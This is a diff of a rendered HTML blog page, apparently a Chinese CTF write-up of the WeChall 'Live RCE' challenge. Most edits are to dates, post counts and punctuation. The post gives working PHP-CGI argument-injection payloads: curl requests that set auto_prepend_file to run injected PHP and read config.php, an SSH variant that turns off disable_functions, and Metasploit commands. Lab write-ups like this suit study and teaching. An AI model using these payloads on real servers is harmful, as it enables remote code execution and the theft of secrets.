@@ -30,7 +30,7 @@
 <meta property="og:description" content="Challenge Warchall 服务器上的 Live RCE 题目，目标是证明对 rce.warchall.net 的可控命令执行，并读取 challenge solution。 WeChall 页面只给入口和提交框，真正的靶机在： 1https:&#x2F;&#x2F;rce.warchall.net&#x2F;index.php Recon 先看源码。PHP-CGI 模式下 -s 参数会泄露源码而不是高亮输出： 1$">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2026-06-26T08:19:57.000Z">
-<meta property="article:modified_time" content="2026-09-08T14:40:47.455Z">
+<meta property="article:modified_time" content="2026-09-15T02:12:10.453Z">
 <meta property="article:author" content="vkkkv">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="php-cgi">
@@ -239,18 +239,18 @@ auto_prepend_file</span></a></li><li class="nav-item nav-level-4"><a class="nav-
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">409</span>
+          <span class="site-state-item-count">532</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-count">16</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">265</span>
+        <span class="site-state-item-count">348</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -323,7 +323,7 @@ auto_prepend_file</span></a></li><li class="nav-item nav-level-4"><a class="nav-
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-08 22:40:47" itemprop="dateModified" datetime="2026-09-08T22:40:47+08:00">2026-09-08</time>
+      <time title="Modified: 2026-09-15 10:12:10" itemprop="dateModified" datetime="2026-09-15T10:12:10+08:00">2026-09-15</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -379,7 +379,7 @@ solution。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) ? (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>] : <span class="string">&#x27;Guest&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;Live RCE [Warchall]&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Live RCE!&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;Hello <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$username</span>; <span class="meta">?&gt;</span>!&lt;/p&gt;</span><br><span class="line">&lt;p&gt;Here are your <span class="variable">$_SERVER</span> vars:&lt;/p&gt;</span><br><span class="line">&lt;pre&gt;<span class="meta">&lt;?php</span> <span class="title function_ invoke__">print_r</span>(<span class="variable">$_SERVER</span>); <span class="meta">?&gt;</span>&lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
 <p>两个关键发现：</p>
 <ol type="1">
-<li><code>-s</code> 生效了——说明 URL 参数直接传给了 PHP-CGI
+<li><code>-s</code> 生效了，说明 URL 参数直接传给了 PHP-CGI
 解释器，而不是被 Apache 吞掉。</li>
 <li>源码里 <code>require '../config.php'</code>，solution
 大概率藏在那里。</li>
@@ -387,7 +387,7 @@ solution。</p>
 <h3 id="vulnerability-php-cgi-argument-injection">Vulnerability: PHP-CGI
 Argument Injection</h3>
 <p>当 PHP 以 CGI 模式运行时（<code>php-cgi</code>），命令行参数可以通过
-URL query string 传递。这不是 bug，是 CGI 协议的设计——query string
+URL query string 传递。这不是 bug，是 CGI 协议的设计：query string
 本来就是传给程序的。PHP-CGI 会解析以 <code>-</code>
 开头的参数，就像命令行 <code>php -d key=value -s file.php</code>
 一样。</p>
@@ -421,22 +421,22 @@ URL query string 传递。这不是 bug，是 CGI 协议的设计——query str
 HTTP，不需要 SSH）</h4>
 <p>通过 <code>-d</code> 覆盖两个关键配置：</p>
 <ul>
-<li><code>allow_url_include=On</code> — 允许 include 远程/流包装器</li>
-<li><code>auto_prepend_file=php://input</code> — 在每个 PHP 文件执行前先
+<li><code>allow_url_include=On</code>：允许 include 远程/流包装器</li>
+<li><code>auto_prepend_file=php://input</code>：在每个 PHP 文件执行前先
 include 请求体</li>
 </ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl -s -X POST \</span><br><span class="line">  <span class="string">&#x27;https://rce.warchall.net/index.php?-d+allow_url_include%3dOn+-d+auto_prepend_file%3dphp://input&#x27;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&lt;?php echo file_get_contents(&quot;../config.php&quot;); ?&gt;&#x27;</span></span><br></pre></td></tr></table></figure>
 <p>输出：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">YOU WIN!</span><br><span class="line">&lt;?php</span><br><span class="line">define(&#x27;ICANHAZRCE&#x27;, &#x27;StrongGard_6_3&#x27;);</span><br><span class="line">return ICANHAZRCE;</span><br><span class="line">?&gt;</span><br><span class="line">YOU WIN!</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
 <p><code>YOU WIN!</code> 是 <code>config.php</code> 里预设的标志。后面的
-HTML 是正常页面渲染——因为 <code>auto_prepend_file</code> 在 index.php
-执行前就跑了我们的 payload。</p>
+HTML 是正常页面渲染，因为 <code>auto_prepend_file</code> 在 index.php
+执行前已运行 payload。</p>
 <h4 id="方法二ssh-auto_prepend_file">方法二：SSH +
 auto_prepend_file</h4>
 <p>如果有 Warchall SSH 访问权限，可以先在服务器上放一个 PHP 文件，然后用
 <code>auto_prepend_file</code> 指向它：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># SSH 上去写文件</span></span><br><span class="line">$ ssh -p 19198 user@warchall.net</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&#x27;&lt;?php echo file_get_contents(&quot;../config.php&quot;); ?&gt;&#x27;</span> &gt; /var/tmp/s.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后触发</span></span><br><span class="line">$ curl <span class="string">&#x27;https://rce.warchall.net/index.php?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3d/var/tmp/s.txt&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>结果要「查看源码」才能看到——因为 PHP 输出混在 HTML
+<p>结果要「查看源码」才能看到，因为 PHP 输出混在 HTML
 里，浏览器渲染后不可见。</p>
 <h4 id="方法三metasploit">方法三：Metasploit</h4>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/http/php_cgi_arg_injection</span><br><span class="line">set RHOSTS rce.warchall.net</span><br><span class="line">set TARGETURI /index.php</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
@@ -496,8 +496,8 @@ auto_prepend_file</h4>
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/wp/WeChall/wechall-cgx-14-cracking-intro-amaze-us/" rel="prev" title="WeChall - CGX#14 - Cracking Intro - Amaze Us">
-                  <i class="fa fa-angle-left"></i> WeChall - CGX#14 - Cracking Intro - Amaze Us
+                <a href="/WeChall/wechall-babbage-coldplay/" rel="prev" title="WeChall - Babbage and Coldplay">
+                  <i class="fa fa-angle-left"></i> WeChall - Babbage and Coldplay
                 </a>
             </div>
             <div class="post-nav-item">
